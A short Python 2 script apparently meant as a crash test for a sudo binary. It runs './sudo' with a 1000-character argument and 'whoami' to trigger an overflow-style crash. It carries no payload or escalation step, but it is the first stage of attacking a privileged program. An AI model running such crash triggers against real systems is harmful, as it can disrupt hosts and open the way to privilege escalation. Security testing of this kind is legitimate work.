import os, sys
import subprocess

PATH_TO_SUDO = './sudo'


def crash_sudo():
	subprocess.call([PATH_TO_SUDO, "a" *1000, 'whoami'])


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    crash_sudo()


if __name__ == '__main__':
    main(sys.argv)
